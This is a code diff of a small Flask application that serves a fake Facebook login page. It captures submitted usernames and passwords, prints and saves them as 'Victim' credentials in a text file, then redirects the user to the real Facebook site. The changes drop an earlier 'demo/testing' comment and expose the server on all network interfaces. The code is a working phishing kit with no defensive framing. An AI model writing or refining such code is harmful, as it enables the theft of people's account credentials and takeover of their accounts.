@@ -1,30 +1,37 @@
 from flask import Flask, render_template, request, redirect
+import logging
+import os
 
 app = Flask(__name__)
 
-@app.route('/')
+# Flask logs कम करें (optional)
+log = logging.getLogger('werkzeug')
+log.setLevel(logging.ERROR)
+
+@app.route('/', methods=['GET'])
 def home():
-    return render_template('facebook.html')  # make sure this file exists
+    return render_template('facebook.html')
 
 @app.route('/login', methods=['POST'])
 def login():
     try:
-        username = request.form['username']
-        password = request.form['password']
+        username = request.form.get('username')
+        password = request.form.get('password')
 
-        # Save to file (for demo/testing purpose only)
+        print(f"Victim username - {username}")
+        print(f"Victim password - {password}")
+
+        # Safe credentials file write
         with open('credentials.txt', 'a') as f:
-            f.write(f"Username: {username}, Password: {password}\n")
+            f.write(f"Victim username - {username}\n")
+            f.write(f"Victim password - {password}\n\n")
 
-        # Print to terminal (optional)
-        print(f"[LOG] Username: {username}, Password: {password}")
-
-        # Correct redirect
         return redirect("https://www.facebook.com/")
-
     except Exception as e:
-        print("Error:", e)
-        return "Something went wrong", 500  # Send proper error response
+        print("Login error:", e)
+        return "Internal Server Error", 500
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    # Important: Avoid conflict by using environment variable
+    os.environ["FLASK_ENV"] = "development"
+    app.run(host='0.0.0.0', port=5000, debug=True)
